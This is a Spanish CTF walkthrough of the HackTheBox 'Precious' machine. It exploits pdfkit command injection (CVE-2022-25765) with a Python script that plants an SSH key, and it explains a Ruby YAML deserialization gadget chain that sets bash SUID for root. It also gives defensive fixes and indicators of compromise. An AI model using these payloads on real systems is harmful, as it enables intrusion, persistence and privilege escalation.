CVE-2022-25765 — pdfkit v0.8.6 Command Injection CRÍTICO
pdfkit construye un comando shell que incluye la URL sin sanitizar. Una URL con la forma http://%20`comando` hace que el shell ejecute el comando en el subshell. Afecta a pdfkit < 0.8.7.

5.1 — CVE-2022-25765: pdfkit Command Injection

¿Cómo funciona la vulnerabilidad?
pdfkit convierte URLs a PDFs usando wkhtmltopdf. Para ello construye un comando shell: wkhtmltopdf [opciones] "URL_USUARIO" output.pdf. Si la URL contiene una secuencia con backticks, el shell interpreta el contenido como un subcomando a ejecutar ANTES de que wkhtmltopdf procese la URL.
PASO 3 Servidor HTTP de apoyo para validación de URL
¿Por qué necesitamos esto? pdfkit hace una petición HTTP GET a la URL antes de procesarla. Si el servidor no responde con 200 OK, pdfkit rechaza la petición y el payload nunca llega al shell. Montamos un servidor mínimo que siempre devuelve 200.
python3 — servidor HTTP que siempre devuelve 200
from http.server import BaseHTTPRequestHandler, HTTPServer

class AlwaysOK(BaseHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b"ok")
  def log_message(self, *args): pass # silenciar logs

HTTPServer(('0.0.0.0', 8080), AlwaysOK).serve_forever()
PASO 4 Generación de SSH keypair e inyección
¿Por qué inyectar SSH key en lugar de reverse shell directa? El payload viaja URL-encoded, lo que puede corromper caracteres especiales de una reverse shell. Inyectar una clave SSH pública es más robusto y nos da acceso persistente y limpio.
python3 — exploit CVE-2022-25765
from urllib.parse import quote
import requests

PUB_KEY = "ssh-ed25519 AAAA...clave_publica"

# Comando que inyectamos: crear .ssh y añadir nuestra clave
cmd = f"mkdir -p /home/ruby/.ssh && echo '{PUB_KEY}' >> /home/ruby/.ssh/authorized_keys"

# Formato crítico: http://%20`command`
# El %20 es un espacio (URL-encoded) que separa el "protocolo" del comando
payload = "http://%20`" + cmd + "`"

# Double-encode: quote() hace que Sinatra decodifique y el shell vea los backticks
encoded = quote(payload, safe="")

requests.post("http://precious.htb/",
  data="url=" + encoded,
  headers={"Content-Type": "application/x-www-form-urlencoded"}
)
¿Por qué quote(payload, safe="")? Sinatra decodifica la URL una vez al recibirla. Al double-encodear con quote(), el backtick (`) llega al shell ya decodificado (%60 → `). Sin double-encoding, el backtick permanece como %2560 y el shell no lo interpreta como un subshell.

5.3 — Escalada de privilegios: henry → root (YAML Deserialization)

PASO 6 sudo -l — descubrir vector de privesc
bash

User henry may run the following commands on precious:

Henry puede ejecutar ese script Ruby como root sin contraseña. Analizamos el script para encontrar el vector.
PASO 7 Análisis de update_dependencies.rb
ruby — código vulnerable
require "yaml"
require 'rubygems'

def list_from_file
  YAML.load(File.read("dependencies.yml")) # ← VULNERABLE: ruta relativa + unsafe load
end
Dos problemas combinados:
1. YAML.load (sin .safe_load) puede instanciar objetos Ruby arbitrarios — permite gadget chains
2. File.read("dependencies.yml") usa ruta relativa — henry controla qué fichero se lee desde su directorio
PASO 8 YAML Deserialization Gadget Chain — anatomía
¿Cómo funciona el gadget chain? En lugar de deserializar solo datos (strings, números), YAML.load puede instanciar objetos Ruby. Encadenando objetos de la librería estándar que se llaman mutuamente durante la inicialización, logramos que la deserialización ejecute código arbitrario.
Gem::Requirement ── yaml_initialize llama requirements.map!
  → Gem::Package::TarReader ── Enumerable: itera entries desde io
    → Net::BufferedIO ── lee y envía data a debug_output
      → Net::WriteAdapter (outer) ── debug_output: socket.send(:resolve, data)
        → Gem::RequestSet#resolve(data)
          @sets << data ← primer call: system(garbage) → false (OK)
          @sets << @git_set ← segundo call: system("NUESTRO_COMANDO") ← EJECUCIÓN!
            → Net::WriteAdapter (inner): socket.send(:system, "COMANDO")
              → Object.new.send(:system, "chmod u+s /bin/bash")
¿Por qué !ruby/object:Object {} en vez de !ruby/proc?
En Ruby 2.7.4, el tag YAML !ruby/proc crea un objeto String, no un Proc. Al llamar String.send(:call, data) se produce NoMethodError: undefined method 'call' for String. La solución es usar cualquier objeto que incluya Kernel (todos en Ruby) y method_id: :system. El método send bypasea la visibilidad privada de system, por lo que Object.new.send(:system, "cmd") ejecuta el comando.

Recomendaciones defensivas
CRÍTICO
Actualizar pdfkit a >= 0.8.7
pdfkit 0.8.7+ sanitiza correctamente los parámetros de URL. También validar que la URL sea una URL HTTP válida antes de procesarla (regex o URI.parse).
CRÍTICO
Usar YAML.safe_load en lugar de YAML.load
YAML.safe_load solo permite tipos básicos. Si se necesitan clases específicas: YAML.safe_load(data, permitted_classes: [SpecificClass]).
ALTO
Rutas absolutas en scripts privilegiados
Cambiar File.read("dependencies.yml") a File.read("/opt/dependencies.yml") para que el usuario no pueda controlar qué fichero se lee.
ALTO
No almacenar creds en ~/.bundle/config
Usar variables de entorno (BUNDLE_RUBYGEMS__ORG) o un vault de secretos. Auditar regularmente ficheros de configuración de cuentas de servicio.

Lecciones aprendidas

Para el atacante

  • Apps web que generan PDFs/imágenes desde URLs → investigar siempre pdfkit/wkhtmltopdf/PhantomJS CVEs
  • Post-foothold en Ruby: cat ~/.bundle/config siempre — contiene creds en texto plano
  • sudo -l es el primer check de privesc en Linux, sin excepciones
  • Scripts privilegiados que leen YAML/JSON/YAML con rutas relativas son vectores de deserialization
  • Fix clave para Ruby 2.7.4: !ruby/proc crea String, no Proc. Usar !ruby/object:Object {} + method_id: :system

Para el defensor

  • Monitorizar ejecuciones de wkhtmltopdf con URLs inusuales (backticks, pipes, subshells)
  • Grep en código fuente Ruby: YAML\.load\b (sin .safe_) → requiere refactoring urgente
  • Scripts sudo deben usar rutas absolutas para todos sus inputs; revisar sudoers regularmente
  • IOCs de este ataque: SSH keys inesperadas en ~/.ssh/authorized_keys, bash con SUID, procesos ruby inusuales
